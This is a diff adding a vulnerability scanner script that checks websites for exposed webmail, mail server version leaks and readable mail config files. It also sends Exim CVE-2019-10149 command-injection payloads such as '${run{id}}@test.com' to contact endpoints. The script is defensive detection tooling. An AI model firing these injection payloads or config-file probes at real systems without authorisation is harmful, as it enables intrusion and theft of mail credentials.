@@ -1,0 +1,325 @@
+#include helpers.inc;
+
+var oobDomain = getGlobalValue("OOBDomain") || "";
+var canary = "gkm" + randStr(8);
+
+function alertFinding(uri, name, details, severity, job) {
+    var ri = new TReportItem();
+    ri.LoadFromFile("Blind_Sql_Injection.xml");
+    ri.affects = uri;
+    ri.alertPath = "Scripts/SMTP Mail RCE";
+    ri.name = name;
+    ri.severity = severity;
+    ri.details = details;
+    if (job) ri.setHttpInfo(job);
+    AddReportItem(ri);
+}
+
+function makeRequest(uri, method, body, headers) {
+    var job = new THTTPJob();
+    job.url = scanURL;
+    job.URI = uri;
+    job.verb = method || "GET";
+    if (body) {
+        job.postData = body;
+    }
+    if (headers) {
+        for (var h = 0; h < headers.length; h++) {
+            job.request.addHeader(headers[h][0], headers[h][1]);
+        }
+    }
+    job.execute();
+    return job;
+}
+
+// ---- 1. SMTP header leakage in HTTP responses ----
+function testSMTPHeaderLeakage() {
+    var job = makeRequest("/", "GET");
+    if (job.wasError) return;
+
+    var headers = job.response.headerValue || "";
+    var body = job.response.body || "";
+    var combined = headers + "\n" + body;
+
+    var smtpPatterns = [
+        { regex: /X-Mailer:\s*([^\r\n]+)/i, desc: "X-Mailer header" },
+        { regex: /X-MimeOLE:\s*([^\r\n]+)/i, desc: "X-MimeOLE header" },
+        { regex: /Received:\s*from\s+([^\r\n]+)/i, desc: "Received header (internal mail routing)" },
+        { regex: /X-Originating-IP:\s*\[?([^\]\r\n]+)/i, desc: "X-Originating-IP header" },
+    ];
+
+    for (var p = 0; p < smtpPatterns.length; p++) {
+        var m = smtpPatterns[p].regex.exec(combined);
+        if (m) {
+            alertFinding("/", "SMTP Information Disclosure",
+                smtpPatterns[p].desc + " detected: [bold]" + m[0].substring(0, 100) + "[/bold][break]" +
+                "This reveals mail server configuration details.", 1, job);
+        }
+    }
+
+    var versionPatterns = [
+        { regex: /Exim\s+([\d.]+)/i, server: "Exim" },
+        { regex: /Postfix/i, server: "Postfix" },
+        { regex: /Dovecot/i, server: "Dovecot" },
+        { regex: /sendmail\s*([\d.]+)?/i, server: "Sendmail" },
+        { regex: /MailEnable/i, server: "MailEnable" },
+        { regex: /hMailServer/i, server: "hMailServer" },
+        { regex: /Zimbra/i, server: "Zimbra" },
+        { regex: /Microsoft-IIS.*SMTP/i, server: "IIS SMTP" },
+    ];
+
+    for (var v = 0; v < versionPatterns.length; v++) {
+        var vm = versionPatterns[v].regex.exec(combined);
+        if (vm) {
+            alertFinding("/", "Mail Server Version Disclosure",
+                "[bold]" + versionPatterns[v].server + "[/bold] detected in HTTP response.[break]" +
+                "Match: [bold]" + vm[0] + "[/bold][break]" +
+                "Check for known CVEs against this mail server version.", 2, job);
+        }
+    }
+}
+
+// ---- 2. Webmail interface discovery ----
+function testWebmailExposure() {
+    var webmailPaths = [
+        { path: "/webmail", name: "Generic Webmail" },
+        { path: "/mail", name: "Mail Interface" },
+        { path: "/roundcube", name: "Roundcube" },
+        { path: "/roundcubemail", name: "Roundcube" },
+        { path: "/rc", name: "Roundcube (short)" },
+        { path: "/owa", name: "Outlook Web App" },
+        { path: "/owa/auth/logon.aspx", name: "OWA Login" },
+        { path: "/exchange", name: "Exchange" },
+        { path: "/EWS/Exchange.asmx", name: "Exchange Web Services" },
+        { path: "/autodiscover/autodiscover.xml", name: "Exchange Autodiscover" },
+        { path: "/zimbra", name: "Zimbra" },
+        { path: "/SOGo", name: "SOGo Groupware" },
+        { path: "/horde", name: "Horde Webmail" },
+        { path: "/horde/imp", name: "Horde IMP" },
+        { path: "/squirrelmail", name: "SquirrelMail" },
+        { path: "/src/login.php", name: "SquirrelMail Login" },
+        { path: "/cpsess0/webmail/paper_lantern/inbox.html", name: "cPanel Webmail" },
+        { path: "/cgi-bin/openwebmail/openwebmail.pl", name: "Open WebMail" },
+        { path: "/ilohamail", name: "IlohaMail" },
+        { path: "/afterlogic", name: "AfterLogic WebMail" },
+        { path: "/rainloop", name: "RainLoop" },
+    ];
+
+    for (var w = 0; w < webmailPaths.length; w++) {
+        var job = makeRequest(webmailPaths[w].path, "GET");
+        if (job.wasError || job.notFound) continue;
+        if (job.response.msg2 == 404 || job.response.msg2 == 403) continue;
+
+        if (job.response.msg2 == 200 || job.response.msg2 == 301 || job.response.msg2 == 302) {
+            var body = job.response.body || "";
+            var isWebmail = (body.indexOf("login") != -1 || body.indexOf("mail") != -1 ||
+                            body.indexOf("password") != -1 || body.indexOf("username") != -1 ||
+                            body.length > 500);
+
+            if (isWebmail || job.response.msg2 == 301 || job.response.msg2 == 302) {
+                alertFinding(webmailPaths[w].path, "Webmail Interface Exposed: " + webmailPaths[w].name,
+                    "[bold]" + webmailPaths[w].name + "[/bold] interface found at [bold]" +
+                    webmailPaths[w].path + "[/bold] (status " + job.response.msg2 + ").[break]" +
+                    "Exposed webmail interfaces can be targeted for credential brute-force, " +
+                    "known CVE exploitation, and phishing attacks.", 2, job);
+            }
+        }
+    }
+}
+
+// ---- 3. SMTP-related API/endpoint injection ----
+function testSMTPEndpoints() {
+    var smtpEndpoints = [
+        { path: "/api/send-email", method: "POST", body: '{"to":"test@test.com","subject":"test","body":"test"}' },
+        { path: "/api/mail/send", method: "POST", body: '{"to":"test@test.com","message":"test"}' },
+        { path: "/api/contact", method: "POST", body: '{"email":"test@test.com","message":"test","name":"test"}' },
+        { path: "/api/v1/email/send", method: "POST", body: '{"to":"test@test.com","body":"test"}' },
+        { path: "/api/notification/email", method: "POST", body: '{"email":"test@test.com","message":"test"}' },
+        { path: "/send-mail", method: "POST", body: '{"to":"test@test.com","subject":"test"}' },
+        { path: "/contact", method: "POST", body: 'email=test%40test.com&message=test&name=test' },
+        { path: "/contact-us", method: "POST", body: 'email=test%40test.com&message=test&name=test' },
+        { path: "/feedback", method: "POST", body: 'email=test%40test.com&message=test&name=test' },
+    ];
+
+    for (var e = 0; e < smtpEndpoints.length; e++) {
+        var contentType = "application/json";
+        if (smtpEndpoints[e].body.indexOf("=") != -1 && smtpEndpoints[e].body.indexOf("{") == -1) {
+            contentType = "application/x-www-form-urlencoded";
+        }
+
+        var job = makeRequest(smtpEndpoints[e].path, smtpEndpoints[e].method,
+            smtpEndpoints[e].body, [["Content-Type", contentType]]);
+
+        if (job.wasError || job.notFound) continue;
+        if (job.response.msg2 == 404) continue;
+
+        var body = job.response.body || "";
+
+        // Check for SMTP error leakage in response
+        var smtpErrors = [
+            /SMTP\s+error/i,
+            /mail\(\)\s*.*?failed/i,
+            /Could not connect to SMTP/i,
+            /Authentication.*?SMTP/i,
+            /relay.*?denied/i,
+            /Recipient.*?rejected/i,
+            /Connection.*?refused.*?25/,
+            /Exim\s+[\d.]+/i,
+            /Postfix.*?error/i,
+            /sendmail.*?error/i,
+            /Dovecot.*?error/i,
+            /smtp_connect_failed/i,
+            /SMTP\s+server.*?response/i,
+        ];
+
+        for (var se = 0; se < smtpErrors.length; se++) {
+            var m = smtpErrors[se].exec(body);
+            if (m) {
+                alertFinding(smtpEndpoints[e].path, "SMTP Error Information Disclosure",
+                    "Email endpoint at [bold]" + smtpEndpoints[e].path + "[/bold] leaks SMTP error details.[break]" +
+                    "Error: [pre][blue]" + m[0] + "[/blue][/pre][break]" +
+                    "This reveals internal mail server configuration and may indicate " +
+                    "vulnerable mail server software.", 2, job);
+                break;
+            }
+        }
+    }
+}
+
+// ---- 4. Exim-specific RCE probe via HTTP email endpoints ----
+function testEximRCE() {
+    var eximPaths = [
+        "/api/send-email",
+        "/api/mail/send",
+        "/api/contact",
+        "/contact",
+        "/send-mail",
+    ];
+
+    // CVE-2019-10149 style: ${run{command}} in RCPT TO / email address
+    var eximPayloads = [
+        { email: '${run{id}}@test.com', desc: 'CVE-2019-10149 ${run{}} in local part' },
+        { email: 'test+${run{id}}@test.com', desc: 'CVE-2019-10149 ${run{}} in extension' },
+        { email: 'test@${run{id}}', desc: 'CVE-2019-10149 ${run{}} in domain' },
+    ];
+
+    for (var p = 0; p < eximPaths.length; p++) {
+        // First check if the endpoint exists
+        var checkJob = makeRequest(eximPaths[p], "POST",
+            '{"email":"test@test.com","message":"test"}',
+            [["Content-Type", "application/json"]]);
+        if (checkJob.wasError || checkJob.response.msg2 == 404) continue;
+
+        var normalBody = checkJob.response.body || "";
+        var normalStatus = checkJob.response.msg2;
+
+        for (var ep = 0; ep < eximPayloads.length; ep++) {
+            var job = makeRequest(eximPaths[p], "POST",
+                '{"email":"' + eximPayloads[ep].email + '","message":"test"}',
+                [["Content-Type", "application/json"]]);
+            if (job.wasError) continue;
+
+            var rceBody = job.response.body || "";
+            var rceStatus = job.response.msg2;
+
+            // Check for Exim error that shows it tried to evaluate the expansion
+            var eximSignals = [
+                /expansion.*?failed/i,
+                /\$\{run\{/,
+                /failed to expand/i,
+                /string expansion/i,
+                /Exim/i,
+                /uid=\d+.*?gid=\d+/,
+            ];
+
+            for (var es = 0; es < eximSignals.length; es++) {
+                var m = eximSignals[es].exec(rceBody);
+                if (m) {
+                    // Confirm: normal email should not trigger this
+                    if (normalBody.indexOf(m[0]) == -1) {
+                        alertFinding(eximPaths[p],
+                            "Potential Exim RCE (CVE-2019-10149)",
+                            "Exim-specific RCE payload triggered a distinctive response.[break]" +
+                            "Payload: [bold]" + eximPayloads[ep].email + "[/bold][break]" +
+                            "Description: " + eximPayloads[ep].desc + "[break]" +
+                            "Signal: [pre][blue]" + m[0] + "[/blue][/pre][break]" +
+                            "Normal request status: " + normalStatus + "[break]" +
+                            "Payload request status: " + rceStatus, 3, job);
+                        break;
+                    }
+                }
+            }
+
+            // Server error on Exim payload but not on normal email
+            if (rceStatus == 500 && normalStatus != 500) {
+                alertFinding(eximPaths[p],
+                    "SMTP Command Injection (Server Error)",
+                    "Exim-style payload caused HTTP 500 at [bold]" + eximPaths[p] + "[/bold].[break]" +
+                    "Payload: [bold]" + eximPayloads[ep].email + "[/bold][break]" +
+                    "Normal email: status [bold]" + normalStatus + "[/bold].[break]" +
+                    "Malicious email: status [bold]500[/bold].[break]" +
+                    "The server-side email function may be passing user input unsanitized to the MTA.", 2, job);
+            }
+        }
+    }
+}
+
+// ---- 5. Mail server config file exposure ----
+function testMailConfigExposure() {
+    var configPaths = [
+        { path: "/etc/exim4/exim4.conf", name: "Exim config" },
+        { path: "/etc/postfix/main.cf", name: "Postfix config" },
+        { path: "/etc/dovecot/dovecot.conf", name: "Dovecot config" },
+        { path: "/mail/config", name: "Mail config" },
+        { path: "/.env", name: "Environment file (may contain SMTP creds)" },
+        { path: "/phpinfo.php", name: "PHP info (SMTP settings)" },
+    ];
+
+    for (var c = 0; c < configPaths.length; c++) {
+        var job = makeRequest(configPaths[c].path, "GET");
+        if (job.wasError || job.notFound) continue;
+        if (job.response.msg2 != 200) continue;
+
+        var body = job.response.body || "";
+
+        var configSignals = [
+            /smtp_host\s*=/i,
+            /smtp_port\s*=/i,
+            /smtp_password\s*=/i,
+            /MAIL_HOST\s*=/i,
+            /MAIL_PASSWORD\s*=/i,
+            /SMTP_USER\s*=/i,
+            /relay_domains/i,
+            /mynetworks\s*=/,
+            /smtpd_recipient_restrictions/,
+            /auth_mechanisms\s*=/,
+            /mail_location\s*=/,
+            /protocols\s*=\s*imap/,
+        ];
+
+        for (var cs = 0; cs < configSignals.length; cs++) {
+            var m = configSignals[cs].exec(body);
+            if (m) {
+                alertFinding(configPaths[c].path,
+                    "Mail Server Configuration Exposed: " + configPaths[c].name,
+                    "[bold]" + configPaths[c].name + "[/bold] found at [bold]" + configPaths[c].path + "[/bold].[break]" +
+                    "Contains mail server configuration: [bold]" + m[0] + "[/bold][break]" +
+                    "This may expose SMTP credentials, relay settings, and internal mail architecture.",
+                    3, job);
+                break;
+            }
+        }
+    }
+}
+
+// main entry point
+testSMTPHeaderLeakage();
+ScriptProgress(20);
+testWebmailExposure();
+ScriptProgress(40);
+testSMTPEndpoints();
+ScriptProgress(60);
+testEximRCE();
+ScriptProgress(80);
+testMailConfigExposure();
+ScriptProgress(100);
